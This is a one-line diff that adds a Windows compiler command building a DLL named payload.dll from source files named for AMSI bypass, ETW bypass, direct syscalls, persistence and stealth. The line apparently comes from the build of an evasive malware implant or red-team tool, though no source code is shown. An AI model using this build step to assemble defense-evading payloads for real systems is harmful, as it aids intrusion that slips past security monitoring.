@@ -1,0 +1,1 @@
+cl /O2 /MT main.c amsi_bypass.c etw_bypass.c syscall.c persistence.c stealth.c modules.c /link /DLL /OUT:payload.dll
